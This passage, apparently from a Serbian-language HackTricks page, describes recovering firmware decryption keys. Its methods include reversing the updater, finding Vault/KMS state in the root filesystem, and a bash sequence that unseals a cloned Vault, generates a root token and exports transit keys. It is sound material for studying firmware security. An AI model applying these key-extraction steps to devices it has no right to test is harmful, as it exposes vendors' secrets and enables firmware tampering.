- Izdvojte zaglavlja, pomake i granice redova pomoću `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` obično označava OpenSSL `enc` format: sledećih 8 bajtova predstavljaju salt, a preostali bajtovi su šifrat.
- Base64 polje koje se dekodira u tačno `256` bajtova snažno ukazuje na to da se radi o RSA-2048 šifratu koji sadrži nasumičnu lozinku/ključ sesije za firmware.
- Odvojeni PGP materijal u istoj datoteci često štiti samo autentičnost; nemojte pretpostavljati da služi za poverljivost.

Ako potraga za statičkim ključevima (`grep`, `strings`, PEM/PGP pretrage) ne uspe, reverzirajte **operativni put dešifrovanja** umesto da samo tražite privatne ključeve:

- Dekompajlirajte updater / binarnu datoteku za upravljanje i utvrdite ko čita šifrovani blob, koji helper/API ga raspakuje i koji logički naziv ključa traži.
- Pretražite izdvojeni root filesystem za KMS stanje (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), kao i unit datoteke i init skripte.
- Tretirajte otvoreni tekst `vault operator unseal ...`, recovery ključeve, bootstrap tokene ili lokalne skripte za automatsko raspakivanje KMS-a kao ekvivalent materijalu privatnog ključa.

Ako uređaj sadrži originalnu Vault binarnu datoteku i backend za skladištenje, obično je lakše ponovo pokrenuti to okruženje nego ponovo implementirati Vault interne mehanizme:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Sa root pristupom na kloniranom KMS-u:

- Omogućite izvoz transit ključeva samo unutar izolovanog klona: `vault write transit/keys/<name>/config exportable=true`
- Izvezite unwrap ključ: `vault read transit/export/encryption-key/<name>`
- Isprobajte oporavljeni RSA ključ sa tačnim parom padding/hash koji koristi KMS. Neuspešna dekripcija pomoću PKCS#1 v1.5 i neuspešna podrazumevana OAEP dekripcija **ne** dokazuju da je ključ pogrešan; mnogi tokovi zasnovani na Vault-u koriste OAEP sa SHA-256, dok uobičajene biblioteke podrazumevano koriste SHA-1.
- Ako payload počinje sa `Salted__`, tačno ponovite KDF koji koristi proizvođač u OpenSSL-u (`EVP_BytesToKey`, često MD5 na starijim uređajima) pre nego što pokušate AES-CBC dekripciju.

Time se „šifrovani firmware“ svodi na opštiji problem: **oporavite operativne ključeve sa strane uređaja, a zatim van mreže ponovite tačne parametre unwrap-a i KDF-a**.

## Obuke i sertifikati

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Razbijanje firmware-a pomoću Claude-a: veštine na seniorskom nivou, autonomija na juniorskom nivou](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologija testiranja bezbednosti firmware-a](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktično IoT hakovanje: definitivan vodič za napade na Internet stvari](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Iskorišćavanje zero-day ranjivosti u napuštenom hardveru – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Kako mi je pametni uređaj od 20 dolara omogućio pristup vašem domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sada me vidiš: sada si hakovan](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Iskorišćavanje Tesla Wall Connector-a preko priključka za punjenje - 2. deo: zaobilaženje zaštite od vraćanja na stariju verziju](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Neka zatreperi: iskorišćavanje Philips Hue Bridge-a bežičnim ažuriranjem](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
